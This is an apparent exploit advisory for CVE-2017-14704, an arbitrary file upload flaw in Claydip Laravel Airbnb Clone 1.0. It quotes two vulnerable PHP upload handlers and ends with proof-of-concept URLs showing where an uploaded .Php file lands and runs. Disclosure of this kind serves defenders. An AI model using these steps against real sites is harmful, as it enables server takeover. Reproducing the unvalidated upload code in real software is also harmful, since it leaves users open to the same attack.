# Exploit Title: Claydip Laravel Airbnb Clone 1.0 - Arbitrary File Upload
# Dork: N/A
# Date: 22.09.2017
# Vendor Homepage: https://www.claydip.com/
# Software Link: https://www.claydip.com/airbnb-clone.html
# Demo: https://www.claydip.com/airbnb_demo.html
# Version: N/A
# Category: Webapps
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: CVE-2017-14704
# # # # #
# Exploit Author: Ihsan Sencan
# Author Web: http://ihsan.net
# Author Social: @ihsansencan
# # # # #
# Description:
# 
# The vulnerability allows an users upload arbitrary file....
# 
# Vulnerable Source:
#
# .............1
#    public function imageSubmit(Request $request)
#    {
        $this->validate($request, [
            &#039;image&#039; => &#039;image|mimes:jpeg,png,jpg,gif,svg|max:2048&#039;,
        ]);
#        if ($request->hasFile(&#039;profile_img_name&#039;)) {
#            $file = $request->file(&#039;profile_img_name&#039;);
#            //getting timestamp
#            $timestamp = str_replace([&#039; &#039;, &#039;:&#039;], &#039;-&#039;, Carbon::now()->toDateTimeString());
#            $img_name = $timestamp. &#039;-&#039; .$file->getClientOriginalName();
#            //$image->filePath = $img_name;
#            $file->move(public_path().&#039;/images/profile&#039;, $img_name);
#            $postData = array(&#039;profile_img_name&#039; => $img_name, &#039;profile_photo_approve&#039; => 0);
#            $user = $this->userRepository->updateUser($postData);
#            flash(&#039;Profile Image Updated Successfully&#039;, &#039;success&#039;);
#            if($request->get(&#039;uploadpage&#039;) == 2) {
#                return \Redirect::to(&#039;user/edit/uploadphoto&#039;);
#            }
#            return \Redirect::to(&#039;user/dashboard&#039;);
#        }
#
#    }
# .............2
#    public function proof_submit(Request $request)
#    {
#        if ($request->hasFile(&#039;profile_img_name&#039;)) {
#            $file = $request->file(&#039;profile_img_name&#039;);
#            //getting timestamp
#            $timestamp = str_replace([&#039; &#039;, &#039;:&#039;], &#039;-&#039;, Carbon::now()->toDateTimeString());
#            $img_name = $timestamp. &#039;-&#039; .$file->getClientOriginalName();
#            //$image->filePath = $img_name;
#            $file->move(public_path().&#039;/images/proof&#039;, $img_name);
#            $postData = array(&#039;idproof_img_src&#039; => $img_name, &#039;id_proof_approved&#039; => 0);
#            $user = $this->userRepository->updateUser($postData);
#            flash(&#039;Proof Updated Successfully&#039;, &#039;success&#039;);
#            return \Redirect::to(&#039;user/edit/uploadproof&#039;);
#        }
#
#    }
# .............
#
# Proof of Concept: 
# 
# http://localhost/[PATH]/user/edit/uploadphoto
# http://localhost/[PATH]/user/edit/uploadproof
# 
# http://localhost/[PATH]/images/profile/[$timestamp].Php
# 
# Etc..
# # # # #

